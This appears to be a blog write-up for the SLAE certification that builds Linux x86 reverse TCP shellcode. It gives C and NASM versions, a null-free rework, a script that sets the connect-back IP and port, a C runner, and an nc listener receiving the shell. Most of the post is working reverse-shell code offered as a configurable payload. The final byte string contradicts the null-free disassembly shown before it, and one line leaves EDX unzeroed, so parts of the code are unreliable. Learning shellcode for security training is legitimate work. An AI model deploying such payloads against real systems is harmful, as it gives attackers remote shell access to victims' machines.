
# SLAE Assignment #2

This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification:

http://securitytube-training.com/online‐courses/securitytube-linux-assembly-expert/

Student ID: SLAE-935

## Assignment

Create a Shell_Reverse_TCP shellcode

* Reverse connects to configured IP and Port
* Execs shell on successful connection
* IP and Port should be easily configurable

## C prototype code:

To better understand how the tcp reverse shellcode works, the following C implementation has been created (comments are in the code):

```c
// Filename: ReverseShellTcp.c
// Author:   SLAE-935
// 
// Purpose: spawn /bin/sh on reverse connect

#include <stdio.h>
#include <unistd.h>
#include <netinet/in.h>
#include <sys/types.h>
#include <sys/socket.h>

// Define address and port
#define REMOTE_ADDR "127.0.0.1"
#define REMOTE_PORT 3333

int main(int argc, char *argv[])
{
    // Build required structure
    struct sockaddr_in sa;
    int s;

    sa.sin_family = AF_INET;
    sa.sin_addr.s_addr = inet_addr(REMOTE_ADDR);
    sa.sin_port = htons(REMOTE_PORT);

    // Connects
    s = socket(AF_INET, SOCK_STREAM, 0);
    connect(s, (struct sockaddr *)&sa, sizeof(sa));

    // Duplicate file descriptor
    dup2(s, 0);
    dup2(s, 1);
    dup2(s, 2);

    // Bind the shell to the connection via file descriptors
    execve("/bin/sh", 0, 0);
    return 0;
}
```

## Assembler Code:

In order to create an analogue asm shellcode it's first necessary to retrieve some information related to syscalls (from http://syscalls.kernelgrok.com/):

### Function: socket
* File: net/socket.c:2210 
* EAX: 0x66
* EBX: 0x1
* ECX: unsigned long __user *args (AF_INET, SOCK_STREAM, IPPROTO_TCP)
* EDX: -
* ESI: -
* EDI: -

### Function: connect
* File: net/socket.c:2210 
* EAX: 0x66
* EBX: 0x3
* ECX: unsigned long __user *args (int sockfd, const struct sockaddr *addr, socklen_t addrlen)
* EDX: -
* ESI: -
* EDI: -

### Function: dup2
* File: fs/fcntl.c:116 
* EAX: 0x3f
* EBX: unsigned int oldfd
* ECX: unsigned int newfd
* EDX: -
* ESI: -
* EDI: -

### Function: execl
* File: arch/alpha/kernel/entry.S:925 
* EAX: 0x0b
* EBX: char __user *
* ECX: char __user *__user *
* EDX: char __user *__user *
* ESI: struct pt_regs *
* EDI: -

The complete assembler program is the following:

```asm
; Filename: ReverseShellTcp.nasm
; Author:  SLAE-935
;
; Purpose: spawn /bin/sh on reverse connect

global _start			

section .text

_start:

    ; Socket
    ; s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    ; EAX = socket_call = 102
    ; EBX = SYS_SOCKET = 1
    ; ECX = pointer to ESP (IPPROTO_TCP, SOCK_STREAM, AF_INET)
    mov eax, 102
    mov ebx, 1
    push 0 ; IPPROTO_TCP
    push 1 ; SOCK_STREAM
    push 2 ; AF_INET
    mov ecx, esp ; ptr to argument array
    int 0x80 
    ; EAX = ret value (socket descriptor)

    mov edi, eax ; save socket descriptor in edi

    ; connect(s, (struct sockaddr *)&sa, sizeof(sa));
    ; EAX = socket_call = 102
    ; EBX = SYS_CONNECT = 3
    ; ECX = pointer to ESP (16, ptr (struct sockaddr))
    mov eax, 102
    mov ebx, 3

    ; build sockaddr_in structure
    ; by definition
    ; struct sockaddr_in {
    ;   short            sin_family;   // AF_INET -> 2 bytes
    ;   unsigned short   sin_port;     // 2 bytes
    ;   struct in_addr   sin_addr;     // see struct in_addr, below
    ;   char             sin_zero[8];  // 8 bytes
    ; };
    ;   
    ;   struct in_addr {
    ;       unsigned long s_addr;  // 4 bytes
    ;   };
    ;
    ; shellcode usage:
    ; sa.sin_family = AF_INET;
    ; sa.sin_addr.s_addr = inet_addr(REMOTE_ADDR);
    ; sa.sin_port = htons(REMOTE_PORT);

    ; Reverse pushing
    push 0x0101017f ; inet_addr("127.0.0.1")
    push WORD 0x5C11 ; htons(4444) -> word = 2bytes
    push WORD 2 ; AF_INET -> word = 2bytes

    mov ecx, esp ; pointer to struct sockaddr_in serv_addr

    ; push args
    push 16 ; sizeof(sa)
    push ecx ; (struct sockaddr *)&sa
    push edi ; s

    mov ecx, esp ; ptr to data structure

    int 0x80

    ; Dup2
    ; dup2(s,0); // standard input
    ; EAX = dup2 = 63
    ; EBX = socket file descritor number = EDI = s
    ; ECX = Standard Input = 0
    mov eax, 63 
    mov ebx, edi
    mov ecx, 0

    int 0x80

    ; dup2(s,1);
    ; EAX = dup2 = 63
    ; EBX = socket file descritor number = EDI = s
    ; ECX = Standard Output = 1
    mov eax, 63
    mov ecx, 1

    int 0x80

    ; dup2(s,2);
    ; EAX = dup2 = 63
    ; EBX = socket file descritor number = EDI = s
    ; ECX = Standard Error = 2
    mov eax, 63
    mov ecx, 2

    int 0x80

    ; execve("/bin/sh", 0, 0);
    ; EAX = execl = 11
    ; EBX = ptr /bin//sh,\0
    ; ECX = ptr 0 (argv[0])
    ; EDX = ptr 0 (envp)
    mov eax, 11

    ;/bin//sh -> 0x2f62696e2f2f7368
    push 0 ; '\0' null terminator
    push 0x68732f2f ; //sh <-little endian
    push 0x6e69622f ; /bin <-little endian
    mov ebx, esp ; pointer to "/bin/sh"\0

    mov ecx, 0
    mov edx, 0

    int 0x80
```

## Check for null bytes

The shellcode has some issues since many null bytes are present, and they may break the execution. The code must be reworked in order to be null free:

```shell
Disassembly of section .text:

08048080 <_start>:
 8048080:	b8 66 00 00 00       	mov    eax,0x66 <--- Null Byte
 8048085:	bb 01 00 00 00       	mov    ebx,0x1 <--- Null Byte
 804808a:	6a 00                	push   0x0 <--- Null Byte
 804808c:	6a 01                	push   0x1
 804808e:	6a 02                	push   0x2
 8048090:	89 e1                	mov    ecx,esp
 8048092:	cd 80                	int    0x80
 8048094:	89 c7                	mov    edi,eax
 8048096:	b8 66 00 00 00       	mov    eax,0x66 <--- Null Byte
 804809b:	bb 03 00 00 00       	mov    ebx,0x3 <--- Null Byte
 80480a0:	68 7f 01 01 01       	push   0x101017f
 80480a5:	66 68 11 5c          	pushw  0x5c11
 80480a9:	66 6a 02             	pushw  0x2
 80480ac:	89 e1                	mov    ecx,esp
 80480ae:	6a 10                	push   0x10
 80480b0:	51                   	push   ecx
 80480b1:	57                   	push   edi
 80480b2:	89 e1                	mov    ecx,esp
 80480b4:	cd 80                	int    0x80
 80480b6:	b8 3f 00 00 00       	mov    eax,0x3f <--- Null Byte
 80480bb:	89 fb                	mov    ebx,edi
 80480bd:	b9 00 00 00 00       	mov    ecx,0x0 <--- Null Byte
 80480c2:	cd 80                	int    0x80
 80480c4:	b8 3f 00 00 00       	mov    eax,0x3f <--- Null Byte
 80480c9:	b9 01 00 00 00       	mov    ecx,0x1 <--- Null Byte
 80480ce:	cd 80                	int    0x80
 80480d0:	b8 3f 00 00 00       	mov    eax,0x3f <--- Null Byte
 80480d5:	b9 02 00 00 00       	mov    ecx,0x2 <--- Null Byte
 80480da:	cd 80                	int    0x80
 80480dc:	b8 0b 00 00 00       	mov    eax,0xb <--- Null Byte
 80480e1:	6a 00                	push   0x0 <--- Null Byte
 80480e3:	68 2f 2f 73 68       	push   0x68732f2f
 80480e8:	68 2f 62 69 6e       	push   0x6e69622f
 80480ed:	89 e3                	mov    ebx,esp
 80480ef:	b9 00 00 00 00       	mov    ecx,0x0 <--- Null Byte
 80480f4:	ba 00 00 00 00       	mov    edx,0x0 <--- Null Byte
 80480f9:	cd 80                	int    0x80
```

null free shellcode:

```asm
; Filename: ReverseShellTcp.nasm
; Author:  SLAE-935
;
; Purpose: spawn /bin/sh on reverse connect (null free)

global _start			

section .text

_start:

    ; Socket
    ; s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    ; EAX = socket_call = 102
    ; EBX = SYS_SOCKET = 1
    ; ECX = pointer to ESP (IPPROTO_TCP, SOCK_STREAM, AF_INET)
    xor eax, eax
    mov al, 102
    xor ebx, ebx
    mov bl, 1
    xor ecx, ecx
    push ecx ; IPPROTO_TCP
    push 1 ; SOCK_STREAM
    push 2 ; AF_INET
    mov ecx, esp ; ptr to argument array
    int 0x80 
    ; EAX = ret value (socket descriptor)

    mov edi, eax ; save socket descriptor in edi

    ; connect(s, (struct sockaddr *)&sa, sizeof(sa));
    ; EAX = socket_call = 102
    ; EBX = SYS_CONNECT = 3
    ; ECX = pointer to ESP (16, ptr (struct sockaddr))
    xor eax, eax
    mov al, 102
    xor ebx, ebx
    mov bl, 3

    ; build sockaddr_in structure
    ; by definition
    ; struct sockaddr_in {
    ;   short            sin_family;   // AF_INET -> 2 bytes
    ;   unsigned short   sin_port;     // 2 bytes
    ;   struct in_addr   sin_addr;     // see struct in_addr, below
    ;   char             sin_zero[8];  // 8 bytes
    ; };
    ;   
    ;   struct in_addr {
    ;       unsigned long s_addr;  // 4 bytes
    ;   };
    ;
    ; shellcode usage:
    ; sa.sin_family = AF_INET;
    ; sa.sin_addr.s_addr = inet_addr(REMOTE_ADDR);
    ; sa.sin_port = htons(REMOTE_PORT);

    ; Reverse pushing
    push 0x0101017f ; inet_addr("127.0.0.1")
    push WORD 0x5C11 ; htons(4444) -> word = 2bytes
    push WORD 2 ; AF_INET -> word = 2bytes

    mov ecx, esp ; pointer to struct sockaddr_in serv_addr

    ; push args
    push 16 ; sizeof(sa)
    push ecx ; (struct sockaddr *)&sa
    push edi ; s

    mov ecx, esp ; ptr to data structure

    int 0x80

    ; Dup2
    ; dup2(s,0); // standard input
    ; EAX = dup2 = 63
    ; EBX = socket file descritor number = EDI = s
    ; ECX = Standard Input = 0
    xor eax, eax
    mov al, 63 
    mov ebx, edi
    xor ecx, ecx

    int 0x80

    ; dup2(s,1);
    ; EAX = dup2 = 63
    ; EBX = socket file descritor number = EDI = s
    ; ECX = Standard Output = 1
    xor eax, eax
    mov al, 63
    xor ecx, ecx
    mov cl, 1

    int 0x80

    ; dup2(s,2);
    ; EAX = dup2 = 63
    ; EBX = socket file descritor number = EDI = s
    ; ECX = Standard Error = 2
    xor eax, eax
    mov al, 63
    xor ecx, ecx
    mov cl, 2

    int 0x80

    ; execve("/bin/sh", 0, 0);
    ; EAX = execl = 11
    ; EBX = ptr /bin//sh,\0
    ; ECX = ptr 0 (argv[0])
    ; EDX = ptr 0 (envp)
    xor eax, eax
    mov al, 11

    ;/bin//sh -> 0x2f62696e2f2f7368
    xor ebx, ebx
    push ebx ; '\0' null terminator
    push 0x68732f2f ; //sh <-little endian
    push 0x6e69622f ; /bin <-little endian
    mov ebx, esp ; pointer to "/bin/sh"\0

    xor ecx, ecx
    mov edx, edx

    int 0x80
```

as visible the assembler program now doesn't contain any null character:

```shell
$ ./compile.sh ReverseShellTcpNullFree 4444 192.168.1.1
######### NASM #########
[+] Configuring port 4444
[+] Configuring address 192.168.1.1
[+] Assembling with Nasm ... 
[+] Done!
[+] Linking ...
[+] Done!
[+] Checking for null bytes ...

ReverseShellTcpNullFree:     file format elf32-i386


Disassembly of section .text:

08048080 <_start>:
 8048080:	31 c0                	xor    eax,eax
 8048082:	b0 66                	mov    al,0x66
 8048084:	31 db                	xor    ebx,ebx
 8048086:	b3 01                	mov    bl,0x1
 8048088:	31 c9                	xor    ecx,ecx
 804808a:	51                   	push   ecx
 804808b:	6a 01                	push   0x1
 804808d:	6a 02                	push   0x2
 804808f:	89 e1                	mov    ecx,esp
 8048091:	cd 80                	int    0x80
 8048093:	89 c7                	mov    edi,eax
 8048095:	31 c0                	xor    eax,eax
 8048097:	b0 66                	mov    al,0x66
 8048099:	31 db                	xor    ebx,ebx
 804809b:	b3 03                	mov    bl,0x3
 804809d:	68 c0 a8 01 01       	push   0x101a8c0
 80480a2:	66 68 11 5c          	pushw  0x5c11
 80480a6:	66 6a 02             	pushw  0x2
 80480a9:	89 e1                	mov    ecx,esp
 80480ab:	6a 10                	push   0x10
 80480ad:	51                   	push   ecx
 80480ae:	57                   	push   edi
 80480af:	89 e1                	mov    ecx,esp
 80480b1:	cd 80                	int    0x80
 80480b3:	31 c0                	xor    eax,eax
 80480b5:	b0 3f                	mov    al,0x3f
 80480b7:	89 fb                	mov    ebx,edi
 80480b9:	31 c9                	xor    ecx,ecx
 80480bb:	cd 80                	int    0x80
 80480bd:	31 c0                	xor    eax,eax
 80480bf:	b0 3f                	mov    al,0x3f
 80480c1:	31 c9                	xor    ecx,ecx
 80480c3:	b1 01                	mov    cl,0x1
 80480c5:	cd 80                	int    0x80
 80480c7:	31 c0                	xor    eax,eax
 80480c9:	b0 3f                	mov    al,0x3f
 80480cb:	31 c9                	xor    ecx,ecx
 80480cd:	b1 02                	mov    cl,0x2
 80480cf:	cd 80                	int    0x80
 80480d1:	31 c0                	xor    eax,eax
 80480d3:	b0 0b                	mov    al,0xb
 80480d5:	31 db                	xor    ebx,ebx
 80480d7:	53                   	push   ebx
 80480d8:	68 2f 2f 73 68       	push   0x68732f2f
 80480dd:	68 2f 62 69 6e       	push   0x6e69622f
 80480e2:	89 e3                	mov    ebx,esp
 80480e4:	31 c9                	xor    ecx,ecx
 80480e6:	89 d2                	mov    edx,edx
 80480e8:	cd 80                	int    0x80
```

## Script for shellcode Customization:

The following shell script allows easy shellcode customization, by providing the port and address as 2nd and 3rd arguments respectively:

```shell
#!/bin/bash

echo '######### GCC #########'
echo '[+] Assembling native c implementation with Gcc ... '
gcc ReverseShellTcp.c -o ReverseShellTcp.c_bin
echo '[+] Done!'
echo

echo '######### NASM #########'

echo '[+] Configuring port '$2
port=`printf %04X $2 |grep -o ..|tac|tr -d '\n'`
sed s/5C11/$port/ <$1.nasm >$1.nasm_port

echo '[+] Configuring address '$3
ipaddr=$3
newip=`printf '%02X' ${ipaddr//./ }`
newiprev=`printf ${newip}|grep -o ..|tac|tr -d '\n'`
sed s/0101017f/$newiprev/ <$1.nasm_port >$1.nasm_ip

rm -rf $1.nasm_port

echo '[+] Assembling with Nasm ... '
nasm -f elf32 -o $1.o $1.nasm_ip
echo '[+] Done!'

# rm -rf $1.nasm_ip

echo '[+] Linking ...'
ld -z execstack -o $1 $1.o
echo '[+] Done!'

# echo '[+] Checking for null bytes ...'
# objdump -d $1 -M intel
# echo '[+] Done!'

echo '[+] Objdump ...'
mycode=`objdump -d ./$1|grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-6 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\\x/g'|paste -d '' -s |sed 's/^/"/' | sed 's/$/"/g'`

echo '[+] Assemble shellcode.c ...'
 
echo "#include<stdio.h>" >shellcode.c
echo "#include<string.h>" >>shellcode.c
echo "unsigned char code[] = \\" >>shellcode.c
echo $mycode";" >>shellcode.c
echo "main()" >>shellcode.c
echo "{" >>shellcode.c
echo "printf(\"Shellcode Length:  %d\n\", strlen(code));" >>shellcode.c
echo "  int (*ret)() = (int(*)())code;" >>shellcode.c
echo "  ret();" >>shellcode.c
echo "}" >>shellcode.c
 
echo '[+] Compile shellcode.c'
 
gcc -fno-stack-protector -z execstack shellcode.c -o shellcode
 
echo '[+] Done!'
```
## Final wrapped shellcode:

The final generated c code is:

```
#include<stdio.h>
#include<string.h>
unsigned char code[] = \
"\x31\xc0\xb0\x66\x31\xdb\xb3\x01\x31\xc9\x51\x6a\x01\x6a\x02\x89\xe1\xcd\x80\x89\xc7\x31\xc0\xb0\x66\x31\xdb\xb3\x03\x6a\x00\x66\x6a\x00\x66\x6a\x02\x89\xe1\x6a\x10\x51\x57\x89\xe1\xcd\x80\x31\xc0\xb0\x3f\x89\xfb\x31\xc9\xcd\x80\x31\xc0\xb0\x3f\x31\xc9\xb1\x01\xcd\x80\x31\xc0\xb0\x3f\x31\xc9\xb1\x02\xcd\x80\x31\xc0\xb0\x0b\x31\xdb\x53\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x89\xd2\xcd\x80";
main()
{
printf("Shellcode Length:  %d\n", strlen(code));
  int (*ret)() = (int(*)())code;
  ret();
}
```

## Proof of execution

The execution yelds the following:

Shellcode execution:

```
$ ./compile.sh ReverseShellTcpNullFree  4444 127.0.0.1
######### GCC #########
[+] Assembling native c implementation with Gcc ... 
[+] Done!

######### NASM #########
[+] Configuring port 4444
[+] Configuring address 127.0.0.1
[+] Assembling with Nasm ... 
[+] Done!
[+] Linking ...
[+] Done!
[+] Objdump ...
[+] Assemble shellcode.c ...
[+] Compile shellcode.c
[+] Done!
vagrant@precise32:/slae_code/Assignment 2$ ./   
compile.sh               ReverseShellTcp.c_bin    ReverseShellTcpNullFree  shellcode                
vagrant@precise32:/slae_code/Assignment 2$ ./ReverseShellTcpNullFree 
```

And the corresponding listener:

```
$ nc -l 4444
id
uid=1000(vagrant) gid=1000(vagrant) groups=1000(vagrant),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),109(lpadmin),110(sambashare),999(admin)
```